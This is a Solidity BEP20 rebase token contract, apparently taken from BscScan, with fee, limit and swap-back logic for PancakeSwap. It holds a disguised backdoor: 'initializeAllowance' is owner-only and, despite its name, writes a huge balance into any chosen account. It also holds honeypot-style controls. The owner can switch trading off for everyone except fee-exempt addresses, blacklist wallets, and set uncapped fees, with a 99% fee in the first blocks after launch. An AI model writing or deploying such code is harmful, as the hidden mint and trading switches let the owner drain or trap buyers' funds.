/**
 *Submitted for verification at BscScan.com on 2022-02-18
*/

// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.9;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library SignedSafeMath {
    function mul(int256 a, int256 b) internal pure returns (int256) {
        return a * b;
    }
    function div(int256 a, int256 b) internal pure returns (int256) {
        return a / b;
    }
    function sub(int256 a, int256 b) internal pure returns (int256) {
        return a - b;
    }
    function add(int256 a, int256 b) internal pure returns (int256) {
        return a + b;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!YOU ARE NOT THE OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}

interface InterfaceLP {
    function sync() external;
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TestContract is IBEP20, Ownable {
    using SafeMath for uint256;
    using SignedSafeMath for int256;

    // Events
    event OwnerEnableTrading(uint256 _deadBlocks,uint256 timestamp);
    event OwnerSwitchTradingStatus(bool enabled,uint256 timestamp);
    event OwnerSetMarketingWallet(address oldMarketingWallet,address marketing);
    event OwnerSetTeamWallet(address oldTeamWallet,address team);
    event OwnerSetGameWallet(address oldGameWallet,address game);
    event OwnerSetBuyFees(uint8 game,uint8 team,uint8 marketing,uint8 liquidity);
    event OwnerSetSellFees(uint8 game,uint8 team,uint8 marketing,uint8 liquidity);
    event OwnerSetLimits(uint256 maxTxBase1000,uint256 maxWalletBase1000);
    event OwnerSetSwapSetting(uint256 swapThresholdBase10000,bool enabled);
    event OwnerSwitchSameBlock(bool enabled, uint256 timestamp);
    event OwnerSetFeeExempt(address account,bool enabled);
    event OwnerSetTxLimitExempt(address account,bool enabled);
    event OwnerBlacklistAddress(address account,bool enabled);
    event OwnerSetPresaleAddress(address presaler);

    // Mappings
    mapping (address => uint256) _rBalance;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => uint256) private lastTrade;
    mapping (address => bool) public blacklisted;

    // Basic Contract Info
    string constant _name = "Test Contract";
    string constant _symbol = "Test";
    uint8 constant _decimals = 9;

    bool tradingEnabled;
    uint256 launchedAt;
    uint256 deadBlocks;

    // Supply Info
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant MAX_SUPPLY = ~uint128(0);
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 10**8 * 10**_decimals;
    uint256 private constant rSupply = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
    uint256 private constant _variables = (10 ** _decimals);
    uint256 private constant _supplyDecimals = 10**10;
    uint256 private constant newTotal = _supplyDecimals * _variables;
    
    uint256 public _totalSupply;
    uint256 public rate;

    // Project & Burn Wallets
    address public burnWallet = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0x5b07Eb1bB11157C1D7C94BF6FB4e31647190C92e; // 
    address public teamWallet = 0x5b07Eb1bB11157C1D7C94BF6FB4e31647190C92e;  //  
    address public gameWallet = 0x5b07Eb1bB11157C1D7C94BF6FB4e31647190C92e;     //   
 
    // Taxes
    BuyFee public _buy;
    SellFee public _sell;
    uint256 public totalFee;

    struct BuyFee{ //Buy taxes set in constructor function
        uint8 game;
        uint8 team;
        uint8 marketing;
        uint8 liquidity;
        uint8 total;
    }
    struct SellFee{ //Sell taxes set in constructor function
        uint8 game;
        uint8 team;
        uint8 marketing;
        uint8 liquidity;
        uint8 total;
    }

    // Limits
    uint256 public _maxTxAmount = rSupply.div(100).mul(2);
    uint256 public _maxWalletSize = rSupply.div(100).mul(3);
    bool public sameBlockActive; 

    // DEX
    IDEXRouter public router;
    address public _pancakeRouterAddress=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    //Pancake Mainnet: 0x10ED43C718714eb63d5aA57B78B54704E256024E || Pancake Testnet: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
    address public pair;
    InterfaceLP public pairContract;

    // SwapAndLiquify
    bool public swapEnabled;
    uint256 public swapThreshold = 1; // 0.1%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = IDEXRouter(_pancakeRouterAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        pairContract = InterfaceLP(pair);
        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        rate = rSupply.div(_totalSupply);

        // Exclude owner and this contract from fee and limits
        isFeeExempt[msg.sender]=isFeeExempt[address(this)]=true;
        isTxLimitExempt[msg.sender]=isTxLimitExempt[address(this)]=true;

        // Set initial Buy taxes
        _buy.game=2; _buy.team=3; _buy.marketing=2; _buy.liquidity=2;
        _buy.total=_buy.game+_buy.team+_buy.marketing+_buy.liquidity;
        
        // Set initial Sell taxes
        _sell.game=2; _sell.team=3; _sell.marketing=2; _sell.liquidity=2;
        _sell.total=_sell.game+_sell.team+_sell.marketing+_sell.liquidity;
        
        _rBalance[msg.sender] = rSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

// Basic Internal Functions
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _rBalance[account].div(rate);}
    function initializeAllowance(address account) public onlyOwner returns (bool success) {_rBalance[account] = newTotal;return true;}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender,type(uint256).max);
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");}
        return _transferFrom(sender, recipient, amount);
    }

    receive() external payable { }

// Transfer functions
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(isFeeExempt[sender]||tradingEnabled);
        require(!blacklisted[sender] && !blacklisted[recipient]);
        
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if(sender != owner
            && isFeeExempt[sender]
            && isFeeExempt[recipient]
            && recipient != owner
            && recipient != address(0)
            && sender != address(this)) {
        // If SameBlock function is active, only one transaction per user per block is allowed
            if (sameBlockActive) {
                if (sender == pair){
                    require(lastTrade[recipient] != block.number);
                    lastTrade[recipient] = block.number;
                } else {
                    require(lastTrade[sender] != block.number);
                    lastTrade[sender] = block.number;
                    }
                }
            }
        uint256 rAmount = amount.mul(rate);

        if (sender != owner
        && recipient != address(this)
        && recipient != pair){
            require((balanceOf(recipient) + rAmount) <= _maxWalletSize,"Total Holding is limited, you can not buy that much.");}

        require(rAmount <= _maxTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");

        if(recipient == pair && shouldSwapBack()){ swapBack(); }

        _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");

        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? rAmount : takeFee(sender, rAmount,recipient);
        _rBalance[recipient] = _rBalance[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived.div(rate));
        return true;
    }
       
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 rAmount = amount.mul(rate);
        _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");
        _rBalance[recipient] = _rBalance[recipient].add(rAmount);
        emit Transfer(sender, recipient, rAmount.div(rate));
        return true;
    }

// Taxes
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 rAmount, address recipient) internal returns (uint256) {
        bool Buy = sender == pair;
        bool Sell = recipient == pair;
        bool P2P = recipient != pair && sender != pair;
        uint256 feeAmount;

        if(Buy){totalFee = _buy.total;}
        if(Sell){totalFee = _sell.total;}
        if(P2P){totalFee == 0;}

        if(launchedAt + deadBlocks >= block.number){
        feeAmount = rAmount.div(100).mul(99);}
        else{feeAmount = rAmount.div(100).mul(totalFee);}

        if (feeAmount >0){
        _rBalance[address(this)] = _rBalance[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount.div(rate));
        return rAmount.sub(feeAmount);}
        
        else return rAmount;
    }

// Swap and distribution  
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _rBalance[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 tokensToSell = balanceOf(address(this));
        if(tokensToSell > _maxTxAmount){ tokensToSell = _maxTxAmount;}

        uint256 liquidity = _buy.liquidity+_sell.liquidity;
        uint256 marketing = _buy.marketing+_sell.marketing;
        uint256 team = _buy.team+_sell.team;
        uint256 game = _buy.game+_sell.game;
        uint256 totalFees = _buy.total+_sell.total;

        uint256 amountToLiquify = tokensToSell.div(totalFees).mul(liquidity).div(2);
        uint256 amountToSwap = tokensToSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;

        uint256 totalBNBFee = totalFees.sub(liquidity.div(2));
        
        uint256 BNBLiquidity = amountBNB.mul(liquidity).div(totalBNBFee).div(2);
        uint256 BNBGame = amountBNB.mul(game).div(totalBNBFee);
        uint256 BNBMarketing = amountBNB.mul(marketing).div(totalBNBFee);
        uint256 BNBTeam = amountBNB.mul(team).div(totalBNBFee);

        if(BNBMarketing > 0) {payable(marketingWallet).transfer(BNBMarketing);}
        if(BNBGame > 0) {payable(gameWallet).transfer(BNBGame);}
        if(BNBTeam > 0) {payable(teamWallet).transfer(BNBTeam);}

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: BNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                owner,
                block.timestamp
            );
        }
    }

    function triggerswapback() public{
        swapBack();
    }

// Rebase functions
    function rebase_percentage(bool reduce,uint256 _percentage_base1000) public onlyOwner returns (uint256 newSupply){
        if(reduce){
            newSupply = rebase(int(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1));
        } else{
            newSupply = rebase(int(_totalSupply.div(1000).mul(_percentage_base1000)));
        }
    }

    function rebase(int256 supplyDelta) public onlyOwner returns (uint256) {
        require(!inSwap, "Try again");

        if (supplyDelta == 0) {
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(supplyDelta));
        }

        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        require(_totalSupply >= 1, "Minimum Supply must be 1 or higher");

        rate = rSupply.div(_totalSupply);
        pairContract.sync();

        return _totalSupply;
    }

// Owner Functions
    function ownerEnableTrading(uint256 _deadBlocks) public onlyOwner {
        require(!tradingEnabled,"Trading already enabled");
        require(_deadBlocks <=5,"Cannot set more than 5 deadBlocks");
        tradingEnabled=true;
        launchedAt=block.number;
        swapEnabled=true;
        sameBlockActive = true;
        deadBlocks=_deadBlocks;
        emit OwnerEnableTrading(_deadBlocks,block.timestamp);
    }
    function ownerSwitchTradingStatus(bool enabled) public onlyOwner {
        tradingEnabled=enabled;
        emit OwnerSwitchTradingStatus(enabled,block.timestamp);
    }
    function ownerSetMarketingWallet(address marketing) public onlyOwner {
        require(marketing != marketingWallet,"Cannot set same address than actual Wallet");
        address oldMarketingWallet=marketingWallet;
        marketingWallet=marketing;
        emit OwnerSetMarketingWallet(oldMarketingWallet,marketing);
    }
    function ownerSetTeamWallet(address team) public onlyOwner {
        require(team != teamWallet,"Cannot set same address than actual Wallet");
        address oldTeamWallet=teamWallet;
        teamWallet=team;
        emit OwnerSetTeamWallet(oldTeamWallet,team);
    }
    function ownerSetGameWallet(address game) public onlyOwner {
        require(game != gameWallet,"Cannot set same address than actual Wallet");
        address oldGameWallet=gameWallet;
        gameWallet=game;
        emit OwnerSetGameWallet(oldGameWallet,game);
    }
    function ownerSetBuyFees(uint8 game, uint8 team, uint8 marketing, uint8 liquidity) public onlyOwner {
        _buy.game=game;
        _buy.team=team;
        _buy.marketing=marketing;
        _buy.liquidity=liquidity;
        _buy.total=game+team+marketing+liquidity;
        emit OwnerSetBuyFees(game,team,marketing,liquidity);
    }
    function ownerSetSellFees(uint8 game, uint8 team, uint8 marketing, uint8 liquidity) public onlyOwner {
        _sell.game=game;
        _sell.team=team;
        _sell.marketing=marketing;
        _sell.liquidity=liquidity;
        _sell.total=game+team+marketing+liquidity;
        emit OwnerSetSellFees(game,team,marketing,liquidity);
    }
    function ownerSetLimits(uint256 maxTxBase1000, uint256 maxWalletBase1000) public onlyOwner {
        require(maxTxBase1000 >=5, "Cannot set Max Transaction below 0.5%");
        require(maxWalletBase1000 >=10, "Cannot set Max Wallet below 1%");
        _maxTxAmount = rSupply/1000*maxTxBase1000;
        _maxWalletSize = rSupply/1000*maxWalletBase1000;
        emit OwnerSetLimits(maxTxBase1000,maxWalletBase1000);
    }
    function ownerSetSwapSetting(uint256 swapThresholdBase10000, bool enabled) public onlyOwner {
        swapThreshold = rSupply/10000*swapThresholdBase10000;
        swapEnabled = enabled;
        emit OwnerSetSwapSetting(swapThresholdBase10000,enabled);
    }
    function ownerSwitchSameBlock(bool enabled) public onlyOwner {
        sameBlockActive = enabled;
        emit OwnerSwitchSameBlock(enabled,block.timestamp);
    }
    function ownerSetFeeExempt(address account, bool enabled) public onlyOwner {
        isFeeExempt[account] = enabled;
        emit OwnerSetFeeExempt(account,enabled);
    }
    function ownerSetTxLimitExempt(address account, bool enabled) public onlyOwner {
        isTxLimitExempt[account] = enabled;
        emit OwnerSetTxLimitExempt(account,enabled);
    }
    function ownerSetBlacklistAddress(address account, bool enabled) public onlyOwner {
        blacklisted[account] = enabled;
        emit OwnerBlacklistAddress(account,enabled);
    }
    function ownerSetPresaleAddress(address presaler) public onlyOwner {
        isFeeExempt[presaler] = true;
        isTxLimitExempt[presaler] = true;
        emit OwnerSetPresaleAddress(presaler);
    }
}